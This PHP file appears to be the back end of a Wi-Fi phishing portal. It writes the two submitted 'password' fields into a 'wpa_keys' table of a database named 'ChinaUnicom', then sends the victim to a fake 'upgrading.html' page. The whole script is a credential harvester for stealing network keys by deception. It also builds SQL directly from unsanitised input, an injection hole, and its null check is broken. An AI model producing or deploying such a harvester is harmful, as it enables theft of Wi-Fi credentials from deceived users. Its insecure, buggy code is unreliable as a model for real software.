<?php
session_start();
ob_start();
$host="localhost";
$username="root";
$db_name="ChinaUnicom";
$tbl_name="wpa_keys";

mysql_connect("$host", "$username") or die("couldn't connect");
mysql_select_db("$db_name");

$password1=$_POST['username'];
$password2=$_POST['password'];

if($password = Null)
{
header("location:error.html");
break;
}

mysql_query("INSERT INTO wpa_keys(password1, password2) VALUES('$password1', '$password2');");
sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>
